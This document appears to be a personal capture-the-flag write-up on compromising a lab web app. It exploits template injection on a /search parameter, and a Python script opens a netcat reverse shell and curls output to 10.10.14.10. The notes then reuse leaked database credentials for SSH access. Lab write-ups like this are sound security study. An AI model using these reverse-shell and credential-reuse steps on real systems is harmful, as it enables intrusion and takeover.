The web app is vulnerable to a template injection attack on the /search page in the "name" parameter
- fuzz this vulnerability with a polyglot
![[Pasted image 20220822130619.png]]
- Use ping to confirm there is code execution
![[Pasted image 20220822130739.png]]
- For some reason, sticking the reverse shell into the HTTP request doesn't work
- To get around this, I downloaded a python script and then ran it with a separate command to get my RCE
```bash
$ cat test.py                                                        130 ⨯
import subprocess

a = subprocess.check_output('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f', shell=True)
# the last line is for debugging if the shell were to not work
subprocess.check_output('curl 10.10.14.10:9001/{}'.format(a), shell=True)
```
![[Pasted image 20220822150950.png]]
From MainController.java in websites source
```java
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```
- Use the password to get a ssh shell as woodenk
